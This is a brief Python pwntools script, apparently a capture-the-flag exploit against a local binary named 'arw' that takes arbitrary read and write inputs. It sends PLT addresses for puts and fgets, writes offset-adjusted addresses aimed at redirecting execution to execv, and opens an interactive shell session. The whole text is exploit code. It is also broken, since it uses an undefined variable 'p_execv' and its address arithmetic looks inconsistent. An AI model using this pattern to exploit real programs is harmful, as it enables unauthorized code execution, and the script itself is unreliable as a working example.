from pwn import *

context.log_level="debug"

x = process("./arw")

plt_puts = 0x080483f0
plt_fgets = 0x080483d0

x.sendlineafter("read? ", str(plt_fgets))
x.sendlineafter("write? ", p32(plt_fgets - 0x28db0))
x.sendlineafter("write? ", p32(p_execv))

x.interactive()
